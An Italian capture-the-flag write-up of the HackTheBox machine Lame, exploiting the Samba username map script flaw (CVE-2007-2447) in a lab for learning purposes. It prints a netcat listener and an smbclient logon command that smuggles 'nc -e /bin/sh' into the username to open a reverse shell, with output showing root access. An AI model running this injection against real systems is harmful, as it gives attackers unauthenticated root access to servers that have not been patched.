Lame è una delle prime macchine disponibili su HackTheBox, rilasciata nel 2017. Espone diversi servizi vulnerabili — il vettore principale è Samba 3.0.20, affetto da CVE-2007-2447 che permette remote code execution senza autenticazione tramite l'opzione username map script. L'accesso ottenuto è direttamente root, senza necessità di privilege escalation.
01

Enumeration

Prima cosa: scan completo delle porte per capire la superficie d'attacco. Uso nmap con detection di versione e script di default.

02

Exploitation

CVE
CVE-2007-2447 — Samba 3.0.0–3.0.25rc3. La funzione username map script passa l'input utente non sanitizzato direttamente alla shell. È possibile iniettare comandi arbitrari nel campo username durante l'autenticazione SMB.

Mi metto in ascolto su una porta e poi triggero la vulnerabilità tramite smbclient, iniettando una reverse shell nel campo username.

NETCAT — listener
$ nc -lvnp 4444 # in un terminale separato
SMBCLIENT — injection
$ smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1" smb: \> logon "/=`nohup nc -e /bin/sh 10.10.14.X 4444`"
WARN
Ricorda di sostituire 10.10.14.X con il tuo IP sulla VPN HTB. Verificalo con ip addr show tun0.
OUTPUT — shell ottenuta
listening on [any] 4444 ... connect to [10.10.14.X] from (UNKNOWN) [10.10.10.3] 54321 id uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon) whoami root

Lessons Learned

  • LEARNED
    Samba 3.0.0–3.0.25rc3 è pericolosamente vulnerabile a command injection via username map script. Sistemi non aggiornati sono esposti a RCE senza autenticazione.
  • LEARNED
    Non tutti gli exploit noti funzionano come atteso — la backdoor di vsftpd 2.3.4 (CVE-2011-2523) era presente ma non attivabile su questa macchina.
  • MISTAKE
    Prima di procedere con l'exploit ho perso tempo a cercare credenziali FTP valide. Meglio enumerare tutti i servizi prima di concentrarsi su un singolo vettore.
  • TOOL
    smbclient con l'opzione --option permette di forzare protocolli legacy necessari per macchine datate.
  • REF
    NVD — CVE-2007-2447  /  Rapid7 — usermap_script
